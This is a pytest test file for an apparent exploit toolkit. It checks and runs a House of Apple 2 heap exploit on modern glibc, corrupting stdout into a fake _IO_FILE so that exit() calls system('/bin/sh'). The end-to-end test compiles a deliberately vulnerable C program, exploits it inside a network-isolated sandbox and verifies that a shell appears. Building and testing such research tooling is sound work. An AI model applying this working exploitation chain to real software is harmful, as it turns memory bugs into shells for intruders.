"""House of Apple 2: turn an arbitrary write + a libc leak into a shell on modern glibc (>= 2.34,
where __free_hook/__malloc_hook are gone) by corrupting _IO_2_1_stdout_ into a fake _IO_FILE that
routes a flush through _IO_wfile_jumps to system(command)."""
import glob
import os
import re
import select
import shutil
import struct
import subprocess
import time

import pytest

from lykos.analyze.poc import heap, rop

_SYS_LIBC = next(iter(glob.glob("/usr/lib/x86_64-linux-gnu/libc.so.6")
                      + glob.glob("/lib/x86_64-linux-gnu/libc.so.6")), None)


def test_build_house_of_apple2_structure():
    blob = heap.build_house_of_apple2(0x1000, wfile_jumps=0xAAAA, system=0xBBBB)
    q = lambda o: struct.unpack_from("<Q", blob, o)[0]   # noqa: E731
    assert blob[:8] == b" /bin/sh"                        # _flags == the command (leading space)
    assert q(0x28) == 1                                   # _IO_write_ptr > _IO_write_base -> flush
    assert q(0xA0) == 0x1000 + 0xE0                       # _wide_data (self-contained)
    assert q(0xD8) == 0xAAAA                              # vtable == _IO_wfile_jumps
    assert q(0xE0 + 0xE0) == 0x1000 + 0x200               # _wide_data->_wide_vtable
    assert q(0x200 + 0x68) == 0xBBBB                      # wide vtable __doallocate == system


def test_house_of_apple2_targets():
    if not _SYS_LIBC:
        pytest.skip("no system libc")
    T = heap.house_of_apple2_targets(open(_SYS_LIBC, "rb").read())
    assert set(T) == {"stdout", "wfile_jumps", "system"} and all(v > 0 for v in T.values())


def _read(p, secs, quiet=0.4):
    out, last, end = b"", time.time(), time.time() + secs
    while time.time() < end:
        r, _, _ = select.select([p.stdout], [], [], 0.1)
        if r:
            c = os.read(p.stdout.fileno(), 4096)
            if not c:
                break
            out += c
            last = time.time()
        elif p.poll() is not None:
            break
        elif out and time.time() - last > quiet:
            break
    return out


def test_house_of_apple2_spawns_shell_on_this_libc():
    """End-to-end on the host libc: a write-what-where + a stdout leak is turned into a real shell
    via House of Apple 2 (exit() flushes the corrupted stdout -> system("/bin/sh"))."""
    from lykos.analyze.dynamic import sandbox
    if sandbox.host_arch() != "x86-64" or not _SYS_LIBC:
        pytest.skip("x86-64 + system libc required")
    gcc = shutil.which("gcc") or shutil.which("cc")
    if not gcc:
        pytest.skip("no C compiler")
    import tempfile
    from pathlib import Path
    d = Path(tempfile.mkdtemp())
    (d / "v.c").write_text(
        '#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <string.h>\n'
        'int main(){ setvbuf(stdout,0,2,0); printf("leak:%p\\n",(void*)stdout); fflush(stdout);\n'
        '  while(1){ char c; if(read(0,&c,1)!=1)break;\n'
        '    if(c==\'w\'){ unsigned long a,l; char b[1024]; read(0,&a,8);read(0,&l,8);\n'
        '      if(l>1024)l=1024; read(0,b,l); memcpy((void*)a,b,l);}\n'
        '    else if(c==\'x\')exit(0);} return 0;}\n')
    exe = d / "v"
    if subprocess.run([gcc, "-no-pie", "-fno-stack-protector", "-w", str(d / "v.c"),
                       "-o", str(exe)], capture_output=True).returncode:
        shutil.rmtree(d, ignore_errors=True)
        pytest.skip("build failed")
    try:
        ld = open(_SYS_LIBC, "rb").read()
        T = heap.house_of_apple2_targets(ld)
        cmd = sandbox.isolate_prefix(str(d), net=False, rw_binds=[str(d)]) + [str(exe)]
        p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                             stderr=subprocess.STDOUT, cwd=str(d))
        try:
            banner = _read(p, 0.6)
            m = re.search(rb"leak:(0x[0-9a-fA-F]+)", banner)
            if not m:
                pytest.skip("no leak (sandbox exec issue)")
            base = int(m.group(1), 16) - T["stdout"]
            stdout_addr = base + T["stdout"]
            blob = heap.build_house_of_apple2(stdout_addr, wfile_jumps=base + T["wfile_jumps"],
                                              system=base + T["system"])
            p.stdin.write(b"w" + struct.pack("<QQ", stdout_addr, len(blob)) + blob)
            p.stdin.flush()
            time.sleep(0.2)
            p.stdin.write(b"x")
            p.stdin.flush()
            time.sleep(0.3)
            p.stdin.write(b"echo FSOP_APPLE2_OK\n")
            p.stdin.flush()
            out = _read(p, 2.0, quiet=1.0)
            assert b"FSOP_APPLE2_OK" in out, f"no shell via House of Apple 2 (out={out[:80]!r})"
        finally:
            for s in (p.stdin, p.stdout):
                try:
                    s.close()
                except Exception:
                    pass
            p.kill()
    finally:
        shutil.rmtree(d, ignore_errors=True)
